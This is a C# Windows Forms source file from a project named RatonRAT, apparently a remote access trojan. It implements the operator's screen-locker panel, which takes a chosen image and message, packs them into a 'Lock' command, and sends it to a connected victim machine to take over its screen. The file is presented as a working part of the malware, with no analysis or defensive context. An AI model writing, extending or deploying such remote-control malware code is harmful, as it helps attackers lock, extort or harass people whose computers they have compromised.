using Server.Connection;
using Stuff;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace RatonRAT.ClientForms
{
    public partial class Screenlocker : Form
    {
        public SillyClient SillyClient { get; set; }
        public Screenlocker()
        {
            InitializeComponent();
        }

        private void button5_Click(object sender, EventArgs e)
        {
            this.Close();
        }

        private void pictureBox1_Click(object sender, EventArgs e)
        {
            OpenFileDialog openFileDialog = new OpenFileDialog();
            openFileDialog.Filter = "Screenlocker supported|*.jpg;*.jpeg;*.png;*.gif;*.bmp";

            if (openFileDialog.ShowDialog() == DialogResult.OK)
            {
                pictureBox1.BackgroundImage = Image.FromFile(openFileDialog.FileName);
            }
        }

        public byte[] GetImageBytes()
        {
            if (pictureBox1.BackgroundImage != null)
            {
                using (var ms = new MemoryStream())
                {
                    pictureBox1.BackgroundImage.Save(ms, pictureBox1.BackgroundImage.RawFormat);
                    return ms.ToArray();
                }
            }
            return new byte[0];
        }

        private void button1_Click(object sender, EventArgs e)
        {
            Pack pack = new Pack();
            pack.Set("Packet", "Lock");
            pack.Set("Text", textBox1.Text);
            pack.Set("Image", GetImageBytes());
            SillyClient.Send(pack.Pacc());
            MessageBox.Show("Screen locked successfully", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
            this.Close();
        }

        private void Screenlocker_Load(object sender, EventArgs e)
        {
            new RatonRAT.Classes.LightMode().Apply(this);
            timer1.Start();
            this.Region = new Region(CreateRoundPath(this.ClientRectangle, 25));
            pictureBox1.Region = new Region(CreateRoundPath(pictureBox1.ClientRectangle, 15));
            button1.Region = new Region(CreateRoundPath(button1.ClientRectangle, 15));
            button5.Region = new Region(CreateRoundPath(button1.ClientRectangle, 15));
            textBox1.Region = new Region(CreateRoundPath(textBox1.ClientRectangle, 15));
        }

        private static GraphicsPath CreateRoundPath(Rectangle rect, int radius)
        {
            GraphicsPath path = new GraphicsPath();
            path.AddArc(rect.X, rect.Y, radius, radius, 180, 90);
            path.AddArc(rect.Width - radius - 1, rect.Y, radius, radius, 270, 90);
            path.AddArc(rect.Width - radius - 1, rect.Height - radius - 1, radius, radius, 0, 90);
            path.AddArc(rect.X, rect.Height - radius - 1, radius, radius, 90, 90);
            path.CloseFigure();
            return path;
        }

        private void Screenlocker_Paint(object sender, PaintEventArgs e)
        {
            if (!this.DesignMode)
            {
                using (Pen pen = new Pen(Color.SandyBrown, 5))
                {
                    e.Graphics.SmoothingMode = SmoothingMode.AntiAlias;
                    e.Graphics.DrawPath(pen, CreateRoundPath(this.ClientRectangle, 25));
                }
            }
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            if (SillyClient == null || !SillyClient.isConnected())
            {
                this.Close();
            }
        }
    }
}
